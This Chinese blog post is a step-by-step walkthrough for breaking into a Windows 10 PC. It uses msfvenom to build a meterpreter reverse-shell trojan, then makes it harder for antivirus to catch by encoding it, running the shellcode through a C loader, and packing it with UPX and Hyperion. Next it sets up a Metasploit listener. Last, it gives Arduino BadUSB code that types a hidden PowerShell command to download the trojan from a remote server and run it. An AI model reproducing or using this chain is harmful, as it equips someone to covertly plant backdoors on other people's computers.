---
title: 'Metasploit(1):记录一次 Win10 的渗透过程'
date: 2020-11-09T11:59:17
categories: [安全]
tags: [internet-security, record, tutorial, msf, badusb]
toc: true
---

最近闲时研究了一下 msf 和 badusb，完成了一次插入“U 盘”黑入 Windows10 的操作。

<!--more-->

# 什么是 Metasploit

Metasploit 是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当 H.D. Moore 在 2003 年发布 Metasploit 时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为 Metasploit 团队一直都在努力开发各种攻击工具，并将它们贡献给所有 Metasploit 用户。

Metasploit 的设计初衷是打造成一个攻击工具开发平台，本书稍后将讲解如何开发攻击工具。然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。

源自 [百度百科](https://baike.baidu.com/item/Metasploit/4926164?fr=aladdin)

# Metasploit 的框架图

![metasploit-framework-pic](/img/msf/metasploit.jpg)

我们常用到的主要是 Tools，Modules 和 Interfaces 里的 Console。

我们一般通过 Tools 里的 msfvenom 设置 payload，生成木马程序，通过社工将木马程序传输到目标机并运行，将传输到目标机内并运行，通过 msfconsole 进行监听，建立会话，进而一步一步攻入目标机。

# Windows10 的渗透过程

渗透过程：

1. 生成木马，上传至服务器（服务器已装好 msf)
2. 服务器监听
3. 想办法在目标机运行木马程序（可以用 badusb）
4. 服务器建立会话，可以进行 meterpreter 的相关渗透操作

## 利用 msfvenom 生成木马程序

> venom，毒液，在蜘蛛侠中是类似寄生体的外星生物，可以寄生在动物体内，进而变得非常强大。
>
> msfvenom，也类似寄生体，它实际上是将 payload 附着到一个脚本、一个 exe 程序中。
>
> payload，攻击载荷，主要用于建立目标机与攻击机之间的稳定连接，并返回一个 shell，也可以进行程序注入等。

> 注意，如果不采用 Kali Linux，需要安装 metasploit 环境，请自行百度

### 没有免杀能力的木马

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=4444 -f exe -o /var/www/html/windows.exe
```

-a 指 architecture，架构，这里用 x86，这样 32 位和 64 位 windows 机都能跑。

--platform 指平台，这里用 windows。

-p 指 payload，这里用 windows/meterpreter/reverse_tcp。

payload 需要 lhost 和 lport 也就是监听机的 IP 和端口号。

-f 指生成格式，这里为 exe。

-o 指导出文件名，这里导出到 80 端口默认的位置/var/www/html 里，命名为 windows.exe。

这是最一般的命令，生成的木马在所有杀软面前几乎 GG，一般不会采用这种方式。

### 免杀能力一般的木马，采用编码器

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\x00' lhost=192.168.1.101 lport=4444 -f exe -o /var/www/html/windows.exe
```

这里多用了一个编码器 x86/shikata_ga_nai。

-e 指 encoder，编码器。

-i 指编码次数。

-b 指去除字符，这里去除空字符。

编码后的木马程序的免杀能力得到了提高，但还是有限。

### 免杀能力较强的木马，通过生成 shellcode+ 自己编译得到

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 -b '\x00' lhost=192.168.1.101 lport=4444 -f c -o ~/windows.c
```

上述命令生成了 C 文件，里面有个 buff 数组，里面是 shellcode 的 16 进制表达。

![shellcode](/img/markdown_20201109135223.png)

然后我们在.c 文件里添加 main 函数：

```c
int main()
{
	int (*func)() = (int(*)())buf;
    func();
    return 0;
}
```

通过交叉编译得到（因为一般我们处于 kali linux 环境）

你可能需要先安装一下交叉编译环境：

```bash
sudo apt-get install g++-mingw-w64-i686
```

然后进行编译，得到 exe 文件

```bash
cd ~
i686-w64-mingw32-g++ windows.c -o windows.exe
```

```bash
cd /usr/share/windows-resources/hyperion
wine hyperion.exe -v ~/windows_upxed.exe ~/windows_upxed_hyperioned.exe
```

目前得到的 exe 木马程序的免杀能力较强，不过也有可能被杀。

### 免杀能力很强的木马，通过压缩壳、加密壳得到

#### UPX 压缩壳

利用 UPX 加一个压缩壳：

```bash
sudo upx windows.exe -o windows-upxed.exe
```

这样得到了一个加了压缩壳的木马程序 windows-upxed.exe

如果不是 kali，没有 upx，就安装一下，再执行上面的命令：

```bash
sudo apt-get install upx
```

#### Hyperion 加密壳

Kali 自带了 hyperion.exe，位于 `/usr/share/windows-resources/hyperion/` 里，但是 Kali 没有自带 Wine，所以我们要安装 Wine

```bash
sudo apt-get install wine
```

但经过测试，想要运行 hyperion.exe，我们还需要安装 Wine32（32 位版 Wine）：

```bash
sudo dpkg --add-architecture i386
sudo apt-get update
sudo apt-get install wine32
```

如果遇到依赖问题:

```bash
sudo apt-get install -f
```

然后重试。

最后安装完成后，wine32 就已经就位了，然后进入 hyperion 的目录，使用 wine 运行:

```bash
cd /usr/share/windows-resources/hyperion
sudo wine hyperion.exe -v ~/windows-upxed.exe ~/windows-upxed-hyperioned.exe
```

然后~目录下就生成了 windows-upxed-hyperioned.exe

现在的木马就是经过了 UPX 和 Hyperion 两层加壳后的木马程序，免杀的能力算很强了。

现在可以把它放到 `/var/www/html` 里了，接下来就是 BadUSB 脚本编写了。

## 服务器开启监听

输入以下命令进入 msf 框架的命令行模式：

```bash
sudo msfconle
```

进入以后，输入

```bash
use multi/handler
```

然后设置 payload

```bash
set payload windows/meterpreter/reverse_tcp
```

然后设置 lhost 和 lport

```bash
set lhost 192.168.1.101 
set lport 4444
```

然后就可以执行了

```bash
run
```

然后就进入了监听模式，等待目标机运行后门木马程序。

## 编写 BadUSB 的代码

BadUSB 如其名，坏 USB，实际上就是 HID 模拟键盘工具。

可以烧写代码，让它能够自动模拟键盘的操作，可以用它来下载服务器上的后门木马程序，然后后台运行。

我的 BadUSB 是基于 Arduino Leonardo 的，所以在 ArduinoIDE 中，代码这样写：

```cpp
#include <Keyboard.h>
void setup() {//初始化
    Keyboard.begin();//开始键盘通讯
    delay(1000);//延时
    Keyboard.press(KEY_LEFT_GUI);//win键
    delay(100);
    Keyboard.press('r');//r键
    delay(100);
    Keyboard.release(KEY_LEFT_GUI);//释放win 键
    Keyboard.release('r');//释放R键
    Keyboard.press(KEY_CAPS_LOCK);//切换大小写，绕过输入法
    Keyboard.release(KEY_CAPS_LOCK);
    Keyboard.println("cmd /c start /min powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://www.zhangkexuan.cn/123.exe'; $file = 'D:\\123.exe'; $clnt.DownloadFile($url,$file);START D:\\123.exe -WindowStyle hidden");
    delay(100);
    Keyboard.press(KEY_CAPS_LOCK);
    Keyboard.release(KEY_CAPS_LOCK);//恢复大小写
    delay(100);
    Keyboard.end();//结束键盘通讯
}

void loop()//循环
{

}
```

烧写到 BadUSB 以后，插上 BadUSB 到 Win10 电脑中，会有一个小窗口瞬间消失，如果没有什么错误提示的话，就已经和主机请求建立连接了。

> 注意：里面的 url 改成自己服务器里后门程序的 url

## meterpreter 进一步渗透

可以做什么事，我就不介绍了，哈哈哈：[https://www.cnblogs.com/backlion/p/9484949.html](https://www.cnblogs.com/backlion/p/9484949.html)



